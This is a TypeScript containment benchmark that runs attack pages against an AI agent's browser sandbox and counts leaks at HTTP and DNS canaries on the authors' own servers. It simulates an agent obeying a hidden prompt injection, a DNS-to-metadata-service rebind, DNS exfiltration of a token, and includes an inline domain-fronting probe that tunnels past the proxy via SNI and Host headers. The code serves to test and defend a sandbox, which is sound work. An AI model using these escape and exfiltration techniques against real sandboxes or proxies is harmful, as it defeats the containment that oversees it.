// Containment benchmark: run every attack page from demo-sites.ts through a
// real sandbox and count what got out. Deterministic and model-free, so the
// numbers measure the sandbox, not how careful a model happens to be.
//   npm run bench   (on the deployment, with the service running)
// Each attack sends to a canary on our own infrastructure, so anything that
// actually left the sandbox is counted there, not by the component under
// test: an HTTP canary on our server, and a DNS canary that is the
// authoritative name server for its own zone (dns-canary/server.mjs), which
// sees any lookup of <token>.<zone> made anywhere on the internet. The
// results go to DATA_DIR/bench.json and are shown on the demo page.
import { execFile } from "node:child_process";
import { randomBytes } from "node:crypto";
import dns from "node:dns/promises";
import { mkdir, writeFile } from "node:fs/promises";
import path from "node:path";
import { promisify } from "node:util";
import { DATA_DIR } from "./agent.ts";
import { ATTACKS, DEMO_URL, DNS_CANARY_ZONE } from "./demo-sites.ts";
import { BROWSER_RUNTIME, DRIVER, Sandbox, type ProxyEvent } from "./sandbox.ts";

const execFileP = promisify(execFile);

const CANARY_URL = (process.env.CANARY_URL ?? "http://localhost:4000/canary").replace(/\/$/, "");
const CANARY_API = CANARY_URL.replace(/\/canary$/, "/api/canary");
// Loopback API of the DNS canary; without it the DNS columns are left out.
const DNS_CANARY_API = (process.env.DNS_CANARY_API ?? "").replace(/\/$/, "");
const demoHost = new URL(DEMO_URL).hostname;

// `fired` = the attack really ran: it made a request to something other than
// the demo host serving the page (blocked or not), or it hit a canary, or, for
// attacks whose only effect is a DNS lookup the proxy never sees, its page
// loaded. A "nothing got out" row only proves containment when it fired.
// `preDnsBlock` = the proxy refused before resolving the name.
type Case = {
  name: string; label: string; layer: string; blocked: number; blockedHosts: string[]; offsiteAllowed: number;
  canaryHits: number; dnsHits: number | null; reasons: string[]; fired: boolean; firedBy: string; preDnsBlock?: boolean;
};

const canaryHits = async (token: string) => ((await (await fetch(`${CANARY_API}/${token}`)).json()) as { hits: number }).hits;
const dnsHits = async (token: string) =>
  DNS_CANARY_API ? ((await (await fetch(`${DNS_CANARY_API}/hits/${token}`)).json()) as { hits: number }).hits : null;

async function runCase(name: string, label: string, allowHost: string, act: (sb: Sandbox, token: string) => Promise<boolean | void>): Promise<Case> {
  const token = randomBytes(8).toString("hex");
  const events: ProxyEvent[] = [];
  const sb = await Sandbox.start(`bench${token.slice(0, 8)}`, [allowHost], (e) => events.push(e));
  let loaded = false;
  try {
    loaded = (await act(sb, token)) === true;
    await sb.send("wait", { ms: 3000 });
  } finally {
    await sb.stop();
  }
  // Proxy log lines and recursive DNS lookups can lag behind the page.
  await new Promise((r) => setTimeout(r, 4000));
  const blocked = events.filter((e) => e.type === "blocked");
  const offsite = events.filter((e) => e.type === "allowed" && e.host !== allowHost);
  // Requests to the demo host only fetch the attack page; they don't show the
  // attack ran, unless the tunnel named another host inside it (fronting).
  const attackRequests = events.filter((e) => (e.type === "blocked" || e.type === "allowed") && (e.host !== demoHost || !!e.inner));
  const hits = await canaryHits(token);
  const dHits = await dnsHits(token);
  const firedBy = attackRequests.length ? "request seen by the proxy" : hits || dHits ? "canary hit" : loaded ? "page loaded" : "";
  return {
    name,
    label,
    layer: allowHost === demoHost ? "allowlist" : "private-address check",
    blocked: blocked.length,
    blockedHosts: [...new Set(blocked.map((e) => e.host ?? "?"))],
    offsiteAllowed: offsite.length,
    canaryHits: hits,
    dnsHits: dHits,
    reasons: [...new Set(blocked.map((e) => e.reason ?? "?"))],
    fired: firedBy !== "",
    firedBy,
  };
}

// Type into every field so input-triggered exfiltration fires.
async function typeIntoForm(sb: Sandbox, token: string) {
  const obs = await sb.send<{ title: string; text: string; elements: { ref: string; tag: string; type?: string }[] }>("observe");
  for (const el of obs.elements) {
    if (el.tag === "input" && ["text", "email", "password"].includes(el.type ?? "")) {
      await sb.send("fill", { ref: el.ref, value: el.type === "email" ? `bench-${token}@example.com` : `bench-${token}` }).catch(() => {});
    }
  }
  return obs;
}

const cases: Case[] = [];
for (const [name, a] of Object.entries(ATTACKS)) {
  process.stdout.write(`${name} … `);
  const c = await runCase(name, a.label, demoHost, async (sb, token) => {
    await sb.send("goto", { url: `${DEMO_URL}/attacks/${name}?t=${token}` });
    const obs = await typeIntoForm(sb, token);
    if (name === "hidden-injection") {
      // An agent that obeys the page: open every off-site URL it asks for.
      for (const u of obs.text.match(/https?:\/\/[^\s"'<>)]+/g) ?? []) {
        if (new URL(u.replace(/\{\{\w+\}\}/g, "x")).hostname === demoHost) continue;
        await sb.send("goto", { url: u.replace(/\{\{\w+\}\}/g, `bench-${token}`) }).catch(() => {});
      }
    }
    return obs.title.startsWith("armed");
  });
  cases.push(c);
  console.log(`fired ${c.fired ? `yes (${c.firedBy})` : "NO"}, blocked ${c.blocked}, off-site allowed ${c.offsiteAllowed}, canary ${c.canaryHits}, dns ${c.dnsHits ?? "-"}`);
}

// Second layer: the allowlisted host itself resolves to the metadata service.
process.stdout.write("dns-to-metadata … ");
const rebindHost = "169.254.169.254.sslip.io";
const dnsCase = await runCase("dns-to-metadata", "Allowlisted hostname whose DNS points at the metadata service (169.254.169.254.sslip.io)", rebindHost, async (sb) => {
  await sb.send("goto", { url: `http://${rebindHost}/v1.json` }).catch(() => {});
});
cases.push(dnsCase);
console.log(`blocked ${dnsCase.blocked} (${dnsCase.reasons.join(", ")})`);

// A top-level navigation to a hostname that carries a secret, inside the DNS
// canary zone. The proxy checks the allowlist before it resolves anything, so
// the name should never be looked up: the DNS canary must see zero queries.
process.stdout.write("dns-exfil … ");
const dnsExfil = await runCase("dns-exfil", "Top-level navigation to a hostname carrying the secret (proxy must refuse it before any DNS lookup)", demoHost, async (sb, token) => {
  await sb.send("goto", { url: `http://${token}.${DNS_CANARY_ZONE}/` }).catch(() => {});
});
dnsExfil.preDnsBlock = dnsExfil.blocked > 0 && dnsExfil.reasons.every((r) => /allowlist/i.test(r));
cases.push(dnsExfil);
console.log(`blocked ${dnsExfil.blocked} (${dnsExfil.reasons.join(", ")}) preDnsBlock=${dnsExfil.preDnsBlock} dns ${dnsExfil.dnsHits ?? "-"}`);

// Domain fronting, as code that escaped the browser would try it: from inside
// the browser container, open a tunnel to the allowed demo host and then name
// a different host inside it (TLS SNI on 443, Host header on 80, or a Host
// header inside TLS behind a matching SNI). The
// orchestrator shares the demo host's IP and web server, so without a check
// this reaches it; the fronted request goes to the HTTP canary, so a success
// is counted there. A control tunnel naming the allowed host must work.
const FRONT_PROBE = `
const http=require("http"),tls=require("tls");const u=new URL(process.env.PROXY_URL);
const out=(r)=>{console.log(JSON.stringify(r));process.exit(0)};
const req=http.request({host:u.hostname,port:u.port,method:"CONNECT",path:process.env.T+":"+process.env.P});
req.on("connect",(res,sock)=>{if(res.statusCode!==200)return out({tunnel:res.statusCode});
const send=(s)=>{s.write("GET "+process.env.PATH_+" HTTP/1.1\\r\\nHost: "+process.env.INNER+"\\r\\nConnection: close\\r\\n\\r\\n");let d="";
s.on("data",(c)=>d+=c);s.on("close",()=>out({reached:d?d.split("\\r\\n")[0]:null}));s.on("error",(e)=>out({error:e.code||e.message}))};
if(process.env.P==="443"){const t=tls.connect({socket:sock,servername:process.env.SNI||process.env.INNER,rejectUnauthorized:false});t.on("error",(e)=>out({error:e.code||e.message}));t.on("secureConnect",()=>send(t))}else send(sock)});
req.on("error",(e)=>out({error:e.message}));req.setTimeout(15000,()=>out({error:"timeout"}));req.end();`;
if (DRIVER === "docker") {
  process.stdout.write("domain-fronting … ");
  const orchestratorHost = new URL(CANARY_URL).hostname;
  const probes: Record<string, unknown> = {};
  const fronting = await runCase(
    "domain-fronting",
    `Domain fronting from code inside the container: a tunnel to the allowed host that names the orchestrator (${orchestratorHost}) inside it`,
    demoHost,
    async (sb, token) => {
      const probe = async (port: string, inner: string, p: string, sni = "") => {
        const { stdout } = await execFileP("docker", ["exec", "-e", `T=${demoHost}`, "-e", `P=${port}`, "-e", `INNER=${inner}`, "-e", `SNI=${sni}`, "-e", `PATH_=${p}`, `${sb.name}-browser`, "node", "-e", FRONT_PROBE], { timeout: 30_000 }).catch((e) => ({ stdout: JSON.stringify({ error: String(e.message).slice(0, 80) }) }));
        return JSON.parse(stdout.trim().split("\n").pop() || "{}");
      };
      probes.control = await probe("443", demoHost, "/acme");
      probes.sni = await probe("443", orchestratorHost, `/canary/${token}`);
      probes.host = await probe("80", orchestratorHost, `/canary/${token}`);
      // Classic fronting: the SNI the proxy sees is the allowed host; only the
      // Host header inside TLS names the orchestrator. The proxy can't read it,
      // so the web server must refuse a Host that differs from the SNI (421).
      probes.hostInsideTls = await probe("443", orchestratorHost, `/canary/${token}`, demoHost);
    },
  );
  fronting.layer = "name inside the tunnel";
  const controlOk = /^HTTP\/1\.1 [23]/.test(String((probes.control as { reached?: string })?.reached ?? ""));
  (fronting as Case & { probes?: unknown; controlOk?: boolean }).probes = probes;
  (fronting as Case & { controlOk?: boolean }).controlOk = controlOk;
  cases.push(fronting);
  console.log(`blocked ${fronting.blocked}, canary ${fronting.canaryHits}, control tunnel ${controlOk ? "ok" : "FAILED"} ${JSON.stringify(probes)}`);
}

// Controls: the same canaries, hit from outside the sandbox, must count.
const control = randomBytes(8).toString("hex");
await fetch(`${CANARY_URL}/${control}`).catch(() => {});
const controlHits = await canaryHits(control);
let dnsControlHits: number | null = null;
if (DNS_CANARY_API) {
  // An ordinary lookup through the host's resolver, the way a leak would travel.
  await dns.resolve4(`${control}.${DNS_CANARY_ZONE}`).catch(() => {});
  await new Promise((r) => setTimeout(r, 2000));
  dnsControlHits = await dnsHits(control);
}

const result = {
  at: new Date().toISOString(),
  sandbox: DRIVER === "docker" ? `docker${BROWSER_RUNTIME ? ` + ${BROWSER_RUNTIME}` : ""}` : "local",
  attacks: cases.length,
  fired: cases.filter((c) => c.fired).length,
  blocked: cases.reduce((n, c) => n + c.blocked, 0),
  offsiteAllowed: cases.reduce((n, c) => n + c.offsiteAllowed, 0),
  canaryHits: cases.reduce((n, c) => n + c.canaryHits, 0),
  controlHits,
  dnsHits: DNS_CANARY_API ? cases.reduce((n, c) => n + (c.dnsHits ?? 0), 0) : null,
  dnsControlHits,
  dnsZone: DNS_CANARY_API ? DNS_CANARY_ZONE : null,
  cases,
};
await mkdir(DATA_DIR, { recursive: true });
await writeFile(path.join(DATA_DIR, "bench.json"), JSON.stringify(result, null, 2));
const dnsSummary = result.dnsHits === null ? "" : ` · DNS canary queries ${result.dnsHits} (control from outside: ${dnsControlHits})`;
console.log(`\n${result.attacks} attacks · ${result.fired} actually fired · ${result.blocked} requests blocked · ${result.offsiteAllowed} off-site requests allowed · canary hits ${result.canaryHits} (control from outside: ${controlHits})${dnsSummary}`);
console.log("\n| Attack | Fired | Blocked requests | Got out |\n|---|---|---|---|");
for (const c of cases) {
  const out = c.offsiteAllowed + c.canaryHits + (c.dnsHits ?? 0);
  console.log(`| ${c.label} | ${c.fired ? "yes" : "no"} | ${c.blocked} | ${out === 0 ? "nothing" : `${c.offsiteAllowed} allowed, ${c.canaryHits} canary hits, ${c.dnsHits ?? 0} DNS queries`} |`);
}
process.exit(0);
